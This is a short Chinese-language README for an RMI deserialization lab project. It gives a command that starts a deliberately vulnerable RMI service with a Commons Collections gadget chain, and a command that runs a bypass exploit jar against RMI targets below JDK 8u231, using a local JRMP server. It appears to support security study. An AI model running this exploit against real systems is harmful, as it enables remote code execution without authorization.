# RMIDeserialize
RMI反序列化学习环境，细节请参考博客[RMI-反序列化-深入-上](https://lalajun.github.io/2020/06/22/RMI%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%B7%B1%E5%85%A5-%E4%B8%8A/)、[RMI-反序列化-深入-下](https://lalajun.github.io/2020/06/22/RMI%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%B7%B1%E5%85%A5-%E4%B8%8B/)

`java -cp RMIDeserialize.jar com.lala.ServerAndRegister` ：起一个包含CC链可以被攻击的RMI服务

`java -jar RMI-Bypass290.jar <攻击目标IP> <攻击目标端口> <本地JRMP服务IP> <本地JRMP服务端口>`：攻击目标8u231版本以下的RMI服务。

其他功能可以从源码运行。

![总结图.png](http://ww1.sinaimg.cn/large/006iKNp3ly1gg378mdwp2j31ut18015j.jpg)
